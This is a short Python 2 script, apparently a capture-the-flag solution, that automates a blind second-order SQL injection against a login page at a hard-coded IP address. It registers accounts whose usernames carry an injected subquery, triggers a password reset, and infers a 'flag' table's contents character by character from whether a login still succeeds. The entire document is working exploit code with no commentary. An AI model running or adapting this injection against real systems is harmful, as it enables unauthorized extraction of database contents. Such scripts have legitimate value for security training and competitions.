from time import sleep
import hashlib
import requests
import urllib
import StringIO
import random
import string

url = "http://54.196.116.77/index.php?page=login"

def userr():
         x = ''
         for i in range(0, 13):
		x += str(int(random.random() * 10))
	 return x

flag = ''
for i in range(1,30):
	for x in string.printable:
		cookie = ""
		username = userr()
		postData = {
         		"register": "Register",
        	 	"name": username,
         		"pass": username,
         		"email": "asdf"
		}

		r = requests.post(url, data = postData)

		#evilname = username + "' and substr((select flag from flag)," + str(i) + ",1) = '" + x + "'#"
		evilname = username + "' and (select flag from flag where substr(flag," + str(i) + ",1) = '" + x + "') #" #= '" + x + "'#"
		postData = {
			"register": "Register",
			"name": evilname,
			"pass": "asdfasdf",
			"email": "asdfasdf"
		}

		r = requests.post(url, data = postData)

		postData = {
			"reset": "Forgot",
			"name": evilname,
			"pass": "",
			"email": ""
		}

		r = requests.post(url, data = postData)

		postData = {
			"login": "Login",
			"name": username,
			"pass": username
		}

		r = requests.post(url, data = postData)

		#print r.text
		if not ("Welcome back" in r.text):

			flag += x
			print flag
			break

